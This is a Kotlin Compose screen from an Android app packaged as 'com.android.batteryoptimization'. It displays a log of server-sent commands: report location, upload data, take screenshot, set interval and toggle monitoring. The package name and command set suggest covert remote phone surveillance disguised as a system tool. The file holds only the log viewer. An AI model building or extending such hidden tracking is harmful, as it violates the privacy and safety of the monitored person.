package com.android.batteryoptimization

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.Delete
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun HeartbeatLogScreen(
    onBackClick: () -> Unit
) {
    val context = LocalContext.current
    var logs by remember { mutableStateOf(AMapLocationHelper.getHeartbeatLogs(context)) }
    var showClearDialog by remember { mutableStateOf(false) }
    var expandedTimestamp by remember { mutableStateOf<Long?>(null) }

    fun refresh() {
        logs = AMapLocationHelper.getHeartbeatLogs(context)
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("心跳记录", color = Color.White) },
                navigationIcon = {
                    IconButton(onClick = onBackClick) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "返回", tint = Color.White)
                    }
                },
                actions = {
                    IconButton(onClick = { refresh() }) {
                        Icon(Icons.Default.Refresh, contentDescription = "刷新", tint = Color.White)
                    }
                    IconButton(onClick = { showClearDialog = true }) {
                        Icon(Icons.Default.Delete, contentDescription = "清空", tint = Color.White)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    navigationIconContentColor = MaterialTheme.colorScheme.onPrimaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer,
                    actionIconContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                )
            )
        }
    ) { paddingValues ->
        if (showClearDialog) {
            AlertDialog(
                onDismissRequest = { showClearDialog = false },
                title = { Text("清空记录", fontWeight = FontWeight.Bold) },
                text = { Text("确认清空所有心跳记录？此操作不可恢复。", fontSize = 15.sp) },
                confirmButton = {
                    TextButton(onClick = {
                        showClearDialog = false
                        AMapLocationHelper.clearHeartbeatLogs(context)
                        refresh()
                    }) {
                        Text("确认", fontWeight = FontWeight.Bold)
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showClearDialog = false }) {
                        Text("取消")
                    }
                }
            )
        }

        if (logs.isEmpty()) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(paddingValues),
                contentAlignment = Alignment.Center
            ) {
                Column(horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(
                        Icons.Default.Info,
                        contentDescription = null,
                        modifier = Modifier.size(64.dp),
                        tint = Color.Gray
                    )
                    Spacer(Modifier.height(12.dp))
                    Text(
                        text = "暂无心跳记录",
                        color = Color.Gray,
                        fontSize = 16.sp
                    )
                    Spacer(Modifier.height(6.dp))
                    Text(
                        text = "收到服务端下发的指令后会记录在此，支持最近 200 条",
                        color = Color(0xFF9E9E9E),
                        fontSize = 13.sp
                    )
                }
            }
        } else {
            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(paddingValues)
                    .padding(12.dp),
                verticalArrangement = Arrangement.spacedBy(10.dp),
                contentPadding = PaddingValues(bottom = 16.dp)
            ) {
                items(logs, key = { it.timestamp }) { entry ->
                    HeartbeatItem(
                        entry = entry,
                        isExpanded = expandedTimestamp == entry.timestamp,
                        onClick = {
                            expandedTimestamp = if (expandedTimestamp == entry.timestamp) null else entry.timestamp
                        }
                    )
                }
            }
        }
    }
}

@Composable
private fun HeartbeatItem(entry: AMapLocationHelper.HeartbeatEntry, isExpanded: Boolean, onClick: () -> Unit) {
    // 指令中文描述
    val commandDesc = when (entry.command) {
        "report_location" -> "上报定位"
        "upload_data" -> "上报数据"
        "take_screenshot" -> "截屏"
        "set_interval" -> "设置间隔"
        "report_enabled" -> "监控开关"
        else -> entry.command
    }
    // 指令颜色
    val commandColor = when (entry.command) {
        "report_enabled" -> Color(0xFFFF9800)
        "report_location" -> Color(0xFF2196F3)
        "upload_data" -> Color(0xFF9C27B0)
        "take_screenshot" -> Color(0xFF00BCD4)
        "set_interval" -> Color(0xFF795548)
        else -> Color(0xFF607D8B)
    }

    Card(
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onClick() },
        shape = RoundedCornerShape(8.dp),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant),
        elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
    ) {
        Column(
            modifier = Modifier.padding(14.dp),
            verticalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            // 第一行：指令名称 + 时间
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    // 指令标识色块
                    Box(
                        modifier = Modifier
                            .size(10.dp)
                            .background(commandColor, RoundedCornerShape(2.dp))
                    )
                    Text(
                        text = commandDesc,
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold,
                        color = MaterialTheme.colorScheme.onSurface
                    )
                    Text(
                        text = entry.command,
                        fontSize = 12.sp,
                        color = Color(0xFF9E9E9E),
                        fontFamily = FontFamily.Monospace
                    )
                }
                Text(
                    text = entry.time,
                    fontSize = 12.sp,
                    color = Color.Gray
                )
            }

            // 展开后显示参数
            if (isExpanded && entry.params.isNotBlank()) {
                Divider(color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.4f), thickness = 1.dp)
                Text(
                    text = "参数：",
                    fontSize = 12.sp,
                    color = Color(0xFF757575),
                    fontWeight = FontWeight.SemiBold
                )
                Text(
                    text = entry.params,
                    fontSize = 12.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant,
                    fontFamily = FontFamily.Monospace
                )
            } else if (entry.params.isNotBlank()) {
                Text(
                    text = "点击查看参数",
                    fontSize = 12.sp,
                    color = Color(0xFFBDBDBD)
                )
            }
        }
    }
}
